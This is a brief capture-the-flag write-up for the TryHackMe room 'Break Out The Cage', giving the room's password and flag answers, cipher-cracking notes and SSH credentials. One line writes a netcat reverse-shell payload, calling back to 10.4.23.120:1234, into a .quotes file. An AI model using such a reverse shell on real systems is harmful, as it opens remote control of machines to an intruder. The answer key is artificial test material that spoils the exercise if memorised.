# TryHackMe Break Out The Cage

>Saikat Karmakar | Feb 14:2021

--------------------------------------------------------------------------

# Task 1
1. What is Weston's password?
```
Mydadisghostrideraintthatcoolnocausehesonfirejokes
```
2. What's the user flag?
```
THM{M37AL_0R_P3N_T35T1NG}
```
3. What's the root flag?
```
THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}
```


--
---------
**Notes**
---------
the dad_tasts file contains base64 encoded & it's evals. to vigenere
we don't know the key.used this site to crack the key 
:https://www.guballa.de/vigenere-solver

ssh
```
user = Weston
pass = Mydadisghostrideraintthatcoolnocausehesonfirejokes
```
echo ";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.23.120 1234 >/tmp/f" > .quotes

haiinspsyanileph vigenere ; key face -> cageisnotalegend
--------------------------------------------------------------------------